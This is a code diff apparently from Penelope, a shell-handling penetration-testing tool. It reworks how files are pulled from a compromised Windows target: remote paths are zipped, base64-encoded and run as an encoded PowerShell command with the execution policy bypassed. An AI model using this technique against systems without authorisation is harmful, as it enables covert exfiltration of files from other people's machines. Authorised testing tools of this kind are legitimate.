@@ -3528,39 +3528,50 @@ class Session:
 
 		elif self.OS == 'Windows':
 			remote_tempfile = f"{self.tmp}\\{rand(10)}.zip"
-			remote_items_ps = "', '".join(shlex.split(remote_items))
-			if self.subtype == 'psh':
-				cmd = (
-					f"try {{ "
-					f"Compress-Archive -Path '{remote_items_ps}' "
-					f"-DestinationPath '{remote_tempfile}' -Force -ErrorAction Stop; "
-					f"$bytes = [IO.File]::ReadAllBytes('{remote_tempfile}'); "
-					f"$b64 = [Convert]::ToBase64String($bytes); "
-					f"Remove-Item '{remote_tempfile}' -Force; "
-					f"Write-Output $b64 "
-					f"}} catch {{ Write-Output \"ERROR: $_\" }}"
-				)
-			else:
-				cmd = (
-					f'powershell -ep bypass -c "'
-					f"try {{ "
-					f"Compress-Archive -Path '{remote_items_ps}' "
-					f"-DestinationPath '{remote_tempfile}' -Force -ErrorAction Stop; "
-					f"$bytes = [IO.File]::ReadAllBytes('{remote_tempfile}'); "
-					f"$b64 = [Convert]::ToBase64String($bytes); "
-					f"Remove-Item '{remote_tempfile}' -Force; "
-					f"Write-Output $b64 "
-					f"}} catch {{ Write-Output ERROR: $_ }}"
-					f'"'
-				)
-			data = self.exec(cmd, value=True, timeout=None)
+			cwd = self.cwd
+			remote_items_list = []
+			for item in shlex.split(remote_items):
+				if re.match(r'^[A-Za-z]:\\|^\\\\', item):
+					remote_items_list.append(item)
+				else:
+					remote_items_list.append(str(PureWindowsPath(cwd) / item))
+
+			remote_items_ps = "', '".join(item.replace("'", "''") for item in remote_items_list)
+			remote_tempfile_ps = remote_tempfile.replace("'", "''")
+			b64_start_marker = "__PENELOPE_B64_BEGIN__"
+			b64_end_marker = "__PENELOPE_B64_END__"
+
+			ps_script = (
+				f"$ErrorActionPreference='Stop'; "
+				f"$ProgressPreference='SilentlyContinue'; "
+				f"$paths = @('{remote_items_ps}'); "
+				f"Compress-Archive -Path $paths -DestinationPath '{remote_tempfile_ps}' -Force -ErrorAction Stop; "
+				f"$bytes = [IO.File]::ReadAllBytes('{remote_tempfile_ps}'); "
+				f"$b64 = [Convert]::ToBase64String($bytes); "
+				f"Remove-Item '{remote_tempfile_ps}' -Force; "
+				f"Write-Output '{b64_start_marker}'; "
+				f"Write-Output $b64; "
+				f"Write-Output '{b64_end_marker}'"
+			)
+			encoded_script = base64.b64encode(ps_script.encode('utf-16le')).decode()
+			cmd = f"powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand {encoded_script}"
+			data = self.exec(cmd, force_cmd=True, value=True, timeout=None)
 
 			if not data:
 				logger.error("No response from target")
 				return []
-			if data.startswith("ERROR:"):
-				logger.error(f"Remote: {data}")
+			if "ERROR:" in data:
+				error_line = next((line for line in data.splitlines() if "ERROR:" in line), data)
+				logger.error(f"Remote: {error_line}")
 				return []
+
+			if b64_start_marker in data and b64_end_marker in data:
+				data = data.split(b64_start_marker, 1)[1].split(b64_end_marker, 1)[0].strip()
+			else:
+				data = ''.join(line.strip() for line in data.splitlines() if re.fullmatch(r'[A-Za-z0-9+/=]+', line.strip()))
+				if not data:
+					logger.error("No response from target")
+					return []
 			downloaded = set()
 			try:
 				with zipfile.ZipFile(io.BytesIO(base64.b64decode(data)), 'r') as zipdata:
